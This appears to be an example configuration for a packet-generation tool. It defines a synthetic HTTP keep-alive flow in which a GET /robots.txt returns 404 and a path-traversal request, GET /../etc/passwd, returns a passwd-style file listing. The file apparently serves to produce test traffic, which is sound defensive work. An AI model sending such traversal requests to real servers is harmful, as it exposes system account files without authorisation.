# examples/http/keepalive_lfi.yaml
#
# 同一条 HTTP keep-alive 流中的两轮请求/响应:
# 1) GET /robots.txt -> 404 Not Found
# 2) GET /../etc/passwd -> 200 OK + passwd-like 内容
link_type: ethernet
seed: 42

flows:
  - name: http-keepalive-lfi
    stack:
      - eth:  { src: "00:11:22:33:44:55", dst: "66:77:88:99:aa:bb" }
      - ipv4: { src: "10.0.0.10", dst: "10.0.0.80", ttl: 64 }
      - tcp:  { sport: 49152, dport: 80, client_isn: 1000, server_isn: 5000, mss: 1460 }
      - tcp_session: { open: handshake, close: fin }
    messages:
      - from: src
        stack:
          - http_request:
              method: GET
              url: /robots.txt
              version: HTTP/1.1
              headers:
                Host: example.com
                User-Agent: pMaker/0.1
                Accept: "*/*"
                Connection: keep-alive

      - from: dst
        stack:
          - http_response:
              version: HTTP/1.1
              status: 404
              reason: Not Found
              headers:
                Server: nginx/1.24.0
                Content-Type: text/plain; charset=utf-8
                Content-Length: auto
                Connection: keep-alive
              body: |
                404 not found

      - from: src
        stack:
          - http_request:
              method: GET
              url: /../etc/passwd
              version: HTTP/1.1
              headers:
                Host: example.com
                User-Agent: pMaker/0.1
                Accept: "*/*"
                Connection: close

      - from: dst
        stack:
          - http_response:
              version: HTTP/1.1
              status: 200
              reason: OK
              headers:
                Server: nginx/1.24.0
                Content-Type: text/plain; charset=utf-8
                Content-Length: auto
                Connection: close
              body: |
                root:x:0:0:root:/root:/bin/bash
                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                bin:x:2:2:bin:/bin:/usr/sbin/nologin
                sys:x:3:3:sys:/dev:/usr/sbin/nologin
                sync:x:4:65534:sync:/bin:/bin/sync
                games:x:5:60:games:/usr/games:/usr/sbin/nologin
                man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
                lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
                mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
                news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
                uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
                proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
                www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
                backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
                list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
                irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
                _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
                dhcpcd:x:996:996:DHCP Client Daemon:/lib/dhcpcd:/bin/false
                messagebus:x:995:995:System Message Bus:/nonexistent:/usr/sbin/nologin
                syslog:x:100:101::/nonexistent:/usr/sbin/nologin
                systemd-resolve:x:989:989:systemd Resolver:/:/usr/sbin/nologin
                _chrony:x:988:988:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
                landscape:x:101:103::/var/lib/landscape:/usr/sbin/nologin
                polkitd:x:987:987:User for polkitd:/:/usr/sbin/nologin
                hab:x:1000:1000::/home/hab:/usr/bin/zsh
